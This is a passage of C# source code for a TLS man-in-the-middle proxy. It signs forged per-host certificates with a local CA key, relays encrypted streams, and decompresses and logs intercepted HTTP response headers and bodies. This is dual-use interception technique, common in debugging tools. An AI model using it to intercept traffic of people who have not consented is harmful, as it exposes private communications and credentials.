                    try { pipeCts.Cancel(); } catch { }

                    // wait for both to finish (observe exceptions and log them)
                    try
                    {
                        if (t1 != null) await t1.ConfigureAwait(false);
                    }
                    catch (Exception ex) { _log($"Pipe t1 ended with: {ex.Message}"); }

                    try
                    {
                        if (t2 != null) await t2.ConfigureAwait(false);
                    }
                    catch (Exception ex) { _log($"Pipe t2 ended with: {ex.Message}"); }

                    // close SSL streams then underlying sockets — avoid closing underlying socket twice
                    try { clientSsl?.Close(); } catch { }
                    try { remoteSsl?.Close(); } catch { }
                    try { remote?.Close(); } catch { }

                    try { pipeCts.Dispose(); } catch { }
                }
            }

            /// <summary>
            /// Create or return cached per-host certificate. The returned X509Certificate2 is imported with EphemeralKeySet to avoid CSP/keyset issues.
            /// </summary>
            private X509Certificate2 GetOrCreateCertForHost(string host)
            {
                if (string.IsNullOrEmpty(host)) host = "localhost";
                if (_cache.TryGetValue(host, out var cached)) return cached;

                lock (_cache)
                {
                    if (_cache.TryGetValue(host, out cached)) return cached;

                    using (RSA rsa = RSA.Create(2048))
                    {
                        var req = new CertificateRequest("CN=" + host, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

                        // SAN
                        var sanBuilder = new SubjectAlternativeNameBuilder();
                        sanBuilder.AddDnsName(host);
                        req.CertificateExtensions.Add(sanBuilder.Build());

                        req.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));
                        req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.5.5.7.3.1") }, false));

                        var notBefore = DateTimeOffset.UtcNow.AddMinutes(-5);

                        // Keep leaf validity inside the CA's validity window:
                        var caNotBefore = _ca.NotBefore;
                        var caNotAfter = _ca.NotAfter;

                        if (notBefore < caNotBefore) notBefore = caNotBefore;
                        var notAfter = notBefore.AddYears(2);
                        if (notAfter > caNotAfter) notAfter = caNotAfter;

                        // serial
                        var serial = Guid.NewGuid().ToByteArray();

                        // produce signed cert and attach private key
                        var signed = req.Create(_ca, notBefore, notAfter, serial);
                        var signedWithKey = signed.CopyWithPrivateKey(rsa);

                        // Export to PFX bytes and re-import with EphemeralKeySet so SslStream can access the key properly
                        var pfxBytes = signedWithKey.Export(X509ContentType.Pfx);
                        var certForUse = new X509Certificate2(
                            pfxBytes,
                            (string)null,
                            X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.MachineKeySet
                        );

                        _cache[host] = certForUse;
                        return certForUse;
                    }
                }
            }

            // It forwards live bytes to dst and accumulates raw response body bytes for logging after stream ends.
            private async Task PipePlainAsync(Stream src, Stream dst, CancellationToken ct, bool isRequest)
            {
                const int BUF_SIZE = 16 * 1024;
                var buf = new byte[BUF_SIZE];

                MemoryStream headerBuf = isRequest ? null : new MemoryStream();
                MemoryStream bodyBuf = null;
                bool headersParsed = false;
                bool isChunked = false;
                long? contentLength = null;
                string contentEncoding = null;

                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        int bytesRead;
                        try
                        {
                            bytesRead = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
                        }
                        catch (OperationCanceledException) { break; }
                        catch (Exception ex)
                        {
                            _log($"{(isRequest ? "C->S" : "S->C")} read error: {ex.Message}");
                            break;
                        }

                        if (bytesRead <= 0) break;

                        // Immediately relay bytes
                        try
                        {
                            await dst.WriteAsync(buf, 0, bytesRead, ct).ConfigureAwait(false);
                            await dst.FlushAsync(ct).ConfigureAwait(false);
                        }
                        catch (Exception ex)
                        {
                            _log($"{(isRequest ? "C->S" : "S->C")} write error: {ex.Message}");
                            break;
                        }

                        if (isRequest) continue; // Only log responses

                        // Accumulate header until full header found
                        if (!headersParsed)
                        {
                            headerBuf.Write(buf, 0, bytesRead);
                            var headersText = TryExtractHeaders(headerBuf.ToArray(), out int headersLength);
                            if (headersText == null)
                                continue; // still waiting for more data

                            headersParsed = true;
                            _log($"HTTP response detected:\n{Truncate(headersText, 1000)}");

                            // Detect encoding and length
                            var matchLength = Regex.Match(headersText, @"Content-Length:\s*(\d+)", RegexOptions.IgnoreCase);
                            if (matchLength.Success)
                                contentLength = long.Parse(matchLength.Groups[1].Value);

                            isChunked = headersText.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0;

                            var matchEncoding = Regex.Match(headersText, @"Content-Encoding:\s*(\S+)", RegexOptions.IgnoreCase);
                            if (matchEncoding.Success)
                                contentEncoding = matchEncoding.Groups[1].Value.ToLowerInvariant();

                            // Create new body buffer, copy any remaining bytes
                            bodyBuf = new MemoryStream();
                            if (headerBuf.Length > headersLength)
                            {
                                headerBuf.Position = headersLength;
                                await headerBuf.CopyToAsync(bodyBuf).ConfigureAwait(false);
                            }

                            headerBuf.Dispose();
                            headerBuf = null;
                        }
                        else if (bodyBuf != null)
                        {
                            bodyBuf.Write(buf, 0, bytesRead);
                        }

                        // Stop reading early if we reached content-length
                        if (contentLength.HasValue && bodyBuf != null && bodyBuf.Length >= contentLength.Value)
                            break;
                    }

                    // At this point: bodyBuf may have full response
                    if (!isRequest && bodyBuf != null && bodyBuf.Length > 0)
                    {
                        bodyBuf.Position = 0;
                        Stream decodeStream = bodyBuf;

                        try
                        {
                            if (!string.IsNullOrEmpty(contentEncoding))
                            {
                                if (contentEncoding == "gzip")
                                    decodeStream = new GZipStream(bodyBuf, CompressionMode.Decompress);
                                else if (contentEncoding == "deflate")
                                    decodeStream = new DeflateStream(bodyBuf, CompressionMode.Decompress);
                                else if (contentEncoding == "br")
                                    decodeStream = new BrotliSharpLib.BrotliStream(bodyBuf, CompressionMode.Decompress);
                            }

                            using (var reader = new StreamReader(decodeStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true))
                            {
                                string bodyText = await reader.ReadToEndAsync().ConfigureAwait(false);
                                if (!string.IsNullOrEmpty(bodyText))
                                    _log($"HTTP response body (decoded, truncated):\n{Truncate(bodyText, 2000)}");
                            }
                        }
                        catch (Exception ex)
                        {
                            _log($"Failed to read response body: {ex.Message}");
                        }
                    }
                }
                finally
                {
                    try { headerBuf?.Dispose(); } catch { }
                    try { bodyBuf?.Dispose(); } catch { }
                }
            }


            // Returns index length up to and including CRLFCRLF, or -1 if headers not complete
            int TryFindHeadersLength(byte[] data)
            {
                if (data == null || data.Length < 4) return -1;
                for (int i = 0; i + 3 < data.Length; i++)
                {
                    if (data[i] == 13 && data[i + 1] == 10 && data[i + 2] == 13 && data[i + 3] == 10)
                    {
                        return i + 4;
                    }
                }
                return -1;
            }

            // --- Helper to detect headers in raw bytes ---
            private static string TryExtractHeaders(byte[] raw, out int headersLength)
            {
                headersLength = 0;
                for (int i = 0; i < raw.Length - 3; i++)
                {
                    if (raw[i] == '\r' && raw[i + 1] == '\n' &&
                        raw[i + 2] == '\r' && raw[i + 3] == '\n')
                    {
                        headersLength = i + 4;
                        return Encoding.ASCII.GetString(raw, 0, headersLength);
                    }
                }
                return null;
            }


            // Helper: try to dechunk/decompress and log captured body (best-effort). Non-blocking.
            private async Task TryLogCapturedBodyAsync(byte[] capturedRaw, string contentEncoding, bool wasChunked, bool isRequest)
            {
                try
                {
                    byte[] dechunked = capturedRaw;
                    if (wasChunked)
                    {
                        if (!TryDechunk(capturedRaw, out dechunked))
                        {
                            _log("Body is chunked and dechunk failed; logging raw (truncated).");
                        }
                    }

                    string bodyText = null;
                    if (!string.IsNullOrEmpty(contentEncoding))
                    {
                        try
                        {
                            bodyText = DecompressToString(dechunked, contentEncoding);
                        }
                        catch (Exception ex)
                        {
                            _log($"Body decompression failed ({contentEncoding}): {ex.Message}. Logging raw (truncated).");
                        }
                    }

                    if (bodyText == null)
                    {
                        // Try to treat as UTF-8 plain text
                        try
                        {
                            bodyText = Encoding.UTF8.GetString(dechunked);
                        }
                        catch { bodyText = null; }
                    }

                    if (bodyText != null)
                    {
                        // Limit logging length
                        const int LOG_BODY_LIMIT = 64 * 1024;
                        var shortBody = Truncate(bodyText, LOG_BODY_LIMIT);
                        if (isRequest) _log($"HTTP request body (decompressed/truncated):\n{shortBody}");
                        else _log($"HTTP response body (decompressed/truncated):\n{shortBody}");
                    }
                    else
                    {
                        // no text interpretation
                        if (isRequest) _log($"HTTP request body: {dechunked.Length} bytes (binary/truncated)");
                        else _log($"HTTP response body: {dechunked.Length} bytes (binary/truncated)");
                    }
                }
                catch (Exception ex)
                {
                    _log("TryLogCapturedBodyAsync error: " + ex.Message);
                }
            }

            // ----- small helpers -----
            // IndexOf for byte arrays
            private static int IndexOf(byte[] haystack, byte[] needle)
            {
                if (haystack == null || needle == null) return -1;
                if (needle.Length == 0) return 0;
                for (int i = 0; i + needle.Length <= haystack.Length; i++)
                {
                    bool ok = true;
                    for (int j = 0; j < needle.Length; j++)
                    {
                        if (haystack[i + j] != needle[j]) { ok = false; break; }
                    }
                    if (ok) return i;
                }
                return -1;
            }

            // Truncate string to N chars, safely
            string Truncate(string s, int max)
            {
                if (string.IsNullOrEmpty(s)) return s;
                if (s.Length <= max) return s;
                return s.Substring(0, max) + "…(truncated)";
            }

            string TryDecodeText(byte[] raw)
            {
                if (raw == null || raw.Length == 0) return null;
                // try utf8 then fallback to ascii
                try { return Encoding.UTF8.GetString(raw); } catch { }
                try { return Encoding.ASCII.GetString(raw); } catch { }
                return null;
            }

            // Parse HTTP headers (very simple). Returns lowercase keys.
            private static Dictionary<string, string> ParseHeaders(string headersRaw)
            {
                var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                if (string.IsNullOrEmpty(headersRaw)) return d;
                using (var sr = new StringReader(headersRaw))
                {
                    string line = sr.ReadLine(); // request/status line
                    if (!string.IsNullOrEmpty(line))
                        d[":startline"] = line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        if (string.IsNullOrEmpty(line)) break;
                        int idx = line.IndexOf(':');
                        if (idx > 0)
                        {
                            var name = line.Substring(0, idx).Trim().ToLowerInvariant();
                            var val = line.Substring(idx + 1).Trim();
                            // combine multiple headers of same name
                            if (d.ContainsKey(name)) d[name] = d[name] + "," + val;
                            else d[name] = val;
                        }
                    }
                }
                return d;
            }

            // Helper: simple dechunker — returns concatenated payload bytes (no trailers support)
            private static byte[] Dechunk(byte[] chunked)
            {
                using (var input = new MemoryStream(chunked))
                using (var outMs = new MemoryStream())
                using (var sr = new StreamReader(input, Encoding.ASCII, false, 1024, true))
                {
                    while (true)
                    {
                        // read chunk size line
                        string sizeLine = sr.ReadLine();
                        if (sizeLine == null) break;
                        int semi = sizeLine.IndexOf(';');
                        if (semi >= 0) sizeLine = sizeLine.Substring(0, semi);
                        sizeLine = sizeLine.Trim();
                        if (sizeLine.Length == 0) continue;
                        int chunkSize = Convert.ToInt32(sizeLine, 16);
                        if (chunkSize == 0)
                        {
                            // consume possible trailer lines until empty line
                            while (true)
                            {
                                string trailer = sr.ReadLine();
                                if (string.IsNullOrEmpty(trailer)) break;
                            }
                            break;
                        }

                        // read exactly chunkSize bytes from underlying stream
                        var buffer = new byte[chunkSize];
                        int read = 0;
                        while (read < chunkSize)
                        {
                            int n = input.Read(buffer, read, chunkSize - read);
                            if (n <= 0) throw new InvalidOperationException("Unexpected end of chunked stream");
                            read += n;
                        }
                        outMs.Write(buffer, 0, chunkSize);

                        // after chunk bytes, there should be CRLF; consume it
                        // read two bytes if available
                        int b1 = input.ReadByte();
                        if (b1 == -1) break;
                        if (b1 == '\r')
                        {
                            int b2 = input.ReadByte();
                            if (b2 != '\n')
                            {
                                // odd but continue
                            }
                        }
                        else if (b1 == '\n')
                        {
                            // okay
                        }
                        else
                        {
                            // not CRLF, but continue
                        }
                    }
                    return outMs.ToArray();
                }
            }

            // Try to dechunk a chunked-encoded payload. Returns false if parsing failed.
            // Fully binary chunked decoder
            private static bool TryDechunk(byte[] raw, out byte[] dechunked)
            {
                dechunked = null;
                try
                {
                    using (var msIn = new MemoryStream(raw))
                    using (var msOut = new MemoryStream())
                    {
                        while (true)
                        {
                            // Read chunk-size line (ends with CRLF)
                            string line = ReadLine(msIn);
                            if (line == null) break; // EOF before chunk-size
                            int semi = line.IndexOf(';');
                            string sizeStr = (semi >= 0 ? line.Substring(0, semi) : line).Trim();
                            if (!int.TryParse(sizeStr, System.Globalization.NumberStyles.HexNumber, null, out int chunkSize))
                            {
                                return false; // invalid chunk-size
                            }

                            if (chunkSize == 0)
                            {
                                // read and discard trailer headers until empty line
                                while (true)
                                {
                                    string trailer = ReadLine(msIn);
                                    if (string.IsNullOrEmpty(trailer)) break;
                                }
                                break; // end of chunked stream
                            }

                            // read exact chunkSize bytes
                            byte[] chunkBuf = new byte[chunkSize];
                            int read = 0;
                            while (read < chunkSize)
                            {
                                int got = msIn.Read(chunkBuf, read, chunkSize - read);
                                if (got <= 0) throw new EndOfStreamException("Unexpected EOF while reading chunk data");
                                read += got;
                            }
                            msOut.Write(chunkBuf, 0, chunkSize);

                            // after chunk data, there should be CRLF
                            int c1 = msIn.ReadByte();
                            int c2 = msIn.ReadByte();
                            if (c1 != '\r' || c2 != '\n')
                                throw new InvalidDataException("Expected CRLF after chunk data");
                        }

                        dechunked = msOut.ToArray();
                        return true;
                    }
                }
                catch
                {
                    try { dechunked = raw; } catch { dechunked = raw; }
                    return false;
                }
            }

            // Helper: read a line from MemoryStream ending with CRLF (returns string without CRLF)
            private static string ReadLine(MemoryStream ms)
            {
                if (ms.Position >= ms.Length) return null;
                using (var msLine = new MemoryStream())
                {
                    while (true)
                    {
                        int b = ms.ReadByte();
                        if (b == -1) break;
                        if (b == '\r')
                        {
                            int next = ms.ReadByte();
                            if (next == '\n') break;
                            msLine.WriteByte((byte)b);
                            if (next != -1) msLine.WriteByte((byte)next);
                        }
                        else
                        {
                            msLine.WriteByte((byte)b);
                        }
                    }
                    return Encoding.ASCII.GetString(msLine.ToArray());
                }
            }

            // Decompress bytes according to Content-Encoding header; returns text (UTF-8) or throws
            private static string DecompressToString(byte[] data, string contentEncoding)
            {
                if (data == null) return null;
                if (string.IsNullOrEmpty(contentEncoding)) return Encoding.UTF8.GetString(data);

                contentEncoding = contentEncoding.ToLowerInvariant();
                // handle common names with possible parameters, e.g. "gzip; q=1.0"
                if (contentEncoding.Contains("gzip"))
                {
                    using (var ms = new MemoryStream(data))
                    using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress))
                    using (var outMs = new MemoryStream())
                    {
                        gz.CopyTo(outMs);
                        return Encoding.UTF8.GetString(outMs.ToArray());
                    }
                }
                if (contentEncoding.Contains("deflate"))
                {
                    using (var ms = new MemoryStream(data))
                    using (var def = new System.IO.Compression.DeflateStream(ms, System.IO.Compression.CompressionMode.Decompress))
                    using (var outMs = new MemoryStream())
                    {
                        def.CopyTo(outMs);
                        return Encoding.UTF8.GetString(outMs.ToArray());
                    }
                }
                if (contentEncoding.Contains("br") || contentEncoding.Contains("brotli"))
                {
                    // Use built-in BrotliStream
                    using (var ms = new MemoryStream(data))
                    using (var br = new BrotliStream(ms, System.IO.Compression.CompressionMode.Decompress))
                    using (var outMs = new MemoryStream())
                    {
                        br.CopyTo(outMs);
                        return Encoding.UTF8.GetString(outMs.ToArray());
                    }
                }

                // unsupported encoding, return raw utf8 attempt
                return Encoding.UTF8.GetString(data);
            }

            // Helper: copy loop (stream → stream) with cancellation
            private async Task RelayStreamAsync(Stream src, Stream dst, CancellationToken ct)
            {
                await PipePlainAsync(src, dst, ct, true).ConfigureAwait(false); // direction is only for logging label
            }

            // small helper to reuse existing UI logging method
            private void _logUi(string msg)
            {
                this.form.PostUi(msg);
            }

            // --- Simple streaming chunked decoder ---
            public class ChunkedStream : Stream
            {
                private readonly Stream _inner;
                private int _chunkRemaining = 0;
                private bool _endReached = false;

                public ChunkedStream(Stream inner) => _inner = inner ?? throw new ArgumentNullException(nameof(inner));

                public override bool CanRead => _inner.CanRead;
                public override bool CanSeek => false;
                public override bool CanWrite => false;
                public override long Length => throw new NotSupportedException();
                public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }

                public override void Flush() => _inner.Flush();

                public override int Read(byte[] buffer, int offset, int count)
                {
                    if (_endReached) return 0;
                    if (_chunkRemaining == 0)
                    {
                        // read next chunk size
                        string line = ReadLine(_inner);
                        if (line == null) { _endReached = true; return 0; }
                        int semi = line.IndexOf(';');
                        string sizeStr = semi >= 0 ? line.Substring(0, semi) : line;
                        _chunkRemaining = Convert.ToInt32(sizeStr.Trim(), 16);
                        if (_chunkRemaining == 0)
                        {
                            // consume trailer + final CRLF
                            while (true)
                            {
                                string trailer = ReadLine(_inner);
                                if (string.IsNullOrEmpty(trailer)) break;
                            }
                            _endReached = true;
                            return 0;
                        }
                    }

                    int toRead = Math.Min(count, _chunkRemaining);
                    int read = _inner.Read(buffer, offset, toRead);
                    if (read > 0) _chunkRemaining -= read;

                    if (_chunkRemaining == 0)
                    {
                        // consume CRLF after chunk
                        _inner.ReadByte();
                        _inner.ReadByte();
                    }

                    return read;
                }

                private static string ReadLine(Stream s)
                {
                    using (var ms = new MemoryStream())
                    {
                        while (true)
                        {
                            int b = s.ReadByte();
                            if (b == -1) break;
                            if (b == '\r')
                            {
                                int next = s.ReadByte();
                                if (next == '\n') break;
                                ms.WriteByte((byte)b);
                                if (next != -1) ms.WriteByte((byte)next);
                            }
                            else ms.WriteByte((byte)b);
                        }
                        return Encoding.ASCII.GetString(ms.ToArray());
                    }
                }

                public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
                public override void SetLength(long value) => throw new NotSupportedException();
                public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
                public override Task<int> ReadAsync(byte[] buffer, int offset, int count, CancellationToken cancellationToken)
                    => Task.Run(() => Read(buffer, offset, count), cancellationToken);
            }
        }   // end MitmHandler

        // --- CA loader (call once at startup) ---
        public class MitmCertAuthority : IDisposable
        {
            public X509Certificate2 CaCert { get; private set; }
            public bool IsValid => CaCert != null && CaCert.HasPrivateKey;

            public MitmCertAuthority(string pfxPath, string pfxPassword)
            {
                // Load PFX with flags so private key is usable by the process
                // MachineKeySet often helps avoid "Keyset does not exist".
                var flags = X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.Exportable;
                CaCert = new X509Certificate2(pfxPath, pfxPassword, flags);

                // diagnostics
                Debug.WriteLine($"CA loaded: Subject={CaCert.Subject}, HasPrivateKey={CaCert.HasPrivateKey}, NotBefore={CaCert.NotBefore:u}, NotAfter={CaCert.NotAfter:u}");
                var bc = CaCert.Extensions.OfType<X509BasicConstraintsExtension>().FirstOrDefault();
                Debug.WriteLine(bc == null ? "CA BasicConstraints: MISSING" : $"CA BasicConstraints: CA={bc.CertificateAuthority}, HasPathLen={bc.HasPathLengthConstraint}");
                if (!CaCert.HasPrivateKey) throw new InvalidOperationException("CA PFX loaded but HasPrivateKey=false. Recreate PFX and ensure private key present.");
            }

            // NEW overload: accept pre-loaded X509Certificate2
            public MitmCertAuthority(X509Certificate2 caCert)
            {
                if (caCert == null) throw new ArgumentNullException(nameof(caCert));
                if (!caCert.HasPrivateKey) throw new ArgumentException("CA cert must include private key", nameof(caCert));
                // Validate BasicConstraints / CA:TRUE here if you like:
                var bc = caCert.Extensions.OfType<X509BasicConstraintsExtension>().FirstOrDefault();
                if (bc == null || !bc.CertificateAuthority)
                    throw new ArgumentException("Issuer certificate must have BasicConstraints CA:TRUE", nameof(caCert));

                CaCert = caCert;
            }        
            
            // expose CA if needed:
            public X509Certificate2 CaCertificate => CaCert;

            public void Dispose()
            {
                try { CaCert?.Dispose(); } catch { }
            }
        }

        // --- Per-host dynamic signer (caching) ---
        public class DynamicCertSigner : IDisposable
        {
            private readonly MitmCertAuthority _authority;
            private readonly ConcurrentDictionary<string, X509Certificate2> _cache = new ConcurrentDictionary<string, X509Certificate2>(StringComparer.OrdinalIgnoreCase);

            public DynamicCertSigner(MitmCertAuthority authority)
            {
                _authority = authority ?? throw new ArgumentNullException(nameof(authority));
                if (!_authority.IsValid) throw new ArgumentException("Authority must have private key loaded.");
            }

            // host may be DNS name or IP string; returns a cert (with private key)
            public X509Certificate2 GetOrCreateCertForHost(string host)
            {
                if (string.IsNullOrEmpty(host)) host = "localhost";
                return _cache.GetOrAdd(host, h => CreateLeafCertificate(h));
            }

            private X509Certificate2 CreateLeafCertificate(string host)
            {
                using (RSA rsa = RSA.Create(2048))
                {
                    var req = new CertificateRequest($"CN={host}", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

                    // Basic constraints: CA = FALSE
                    req.CertificateExtensions.Add(new X509BasicConstraintsExtension(false, false, 0, false));

                    // Key usage
                    req.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));
                    req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.5.5.7.3.1") }, false)); // serverAuth

                    // SAN: choose IP vs DNS
                    var san = new SubjectAlternativeNameBuilder();
                    if (IPAddress.TryParse(host, out var ip))
                    {
                        san.AddIpAddress(ip);
                    }
                    else
                    {
                        san.AddDnsName(host);
                    }
                    req.CertificateExtensions.Add(san.Build());

                    // SubjectKeyIdentifier
                    req.CertificateExtensions.Add(new X509SubjectKeyIdentifierExtension(req.PublicKey, false));

                    // validity - ensure within CA's range
                    var caNotBefore = DateTimeOffset.UtcNow.AddMinutes(-5);
                    var notBefore = DateTimeOffset.UtcNow.AddMinutes(-5);
                    var notAfterCandidate = notBefore.AddYears(2);

                    var caNotAfter = _authority.CaCert.NotAfter.ToUniversalTime();
                    if (notAfterCandidate.UtcDateTime > caNotAfter)
                    {
                        // clamp to CA.NotAfter minus a minute
                        notAfterCandidate = new DateTimeOffset(caNotAfter).AddMinutes(-1);
                    }

                    // Serial
                    var serial = new byte[16];
                    using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(serial);

                    // Create signed cert using CA that has private key
                    var issuer = _authority.CaCert; // must have private key
                    var signed = req.Create(issuer, notBefore, notAfterCandidate, serial);

                    // Combine with the private key we just created
                    var certWithKey = signed.CopyWithPrivateKey(rsa);

                    // Export to PFX in memory to ensure it has an accessible private key for SslStream
                    var exported = certWithKey.Export(X509ContentType.Pfx, (string)null);
                    var final = new X509Certificate2(exported, (string)null, X509KeyStorageFlags.EphemeralKeySet | X509KeyStorageFlags.Exportable);

                    // Keep in cache; the cached certificate should be disposed if you clear cache on shutdown
                    return final;
                }
            }

            public void Dispose()
            {
                foreach (var kv in _cache)
                {
                    try { kv.Value?.Dispose(); } catch { }
                }
                _cache.Clear();
            }
        }

    } // end Reverse_Proxy class
} // end namespace
